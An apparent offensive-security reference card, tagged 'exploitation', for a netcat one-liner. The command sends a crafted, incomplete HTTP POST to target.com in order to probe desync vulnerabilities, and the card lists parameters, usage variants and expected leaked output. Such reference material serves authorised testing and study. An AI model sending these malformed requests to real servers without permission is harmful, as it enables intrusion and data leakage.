---
data: >-
  echo -ne 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nincomp'
  | nc target.com 80
tags:
  - http
  - exploitation
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: e9003ac1-ef12-4720-a821-72b3a66c31f1
created_at: '2025-12-13T09:01:22.512Z'
updated_at: '2025-12-13T09:01:22.512Z'
verified: false
validated: true
submitted: true
---
# netcat-send-http-request

## Command

```bash
echo -ne 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nincomp' | nc target.com 80
```

## Description

This command uses netcat to send a raw, incomplete HTTP POST request for exploiting desync vulnerabilities by piping crafted request data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo -ne` | Crafts the raw HTTP request | Yes |
| `nc target.com 80` | Connects to target on port 80 | Yes |

## Examples

### Basic Usage

```bash
echo -ne 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nincomp' | nc target.com 80
```

### Advanced Usage

```bash
echo -ne 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nincomp' | nc -v target.com 8080 > response.txt
```

## Expected Output

Raw server response, including any error messages or leaked data.

## Related

- [[commands/curl-send-incomplete-post]]
- [[procedures/Craft-and-Send-Incomplete-POST-Request]]
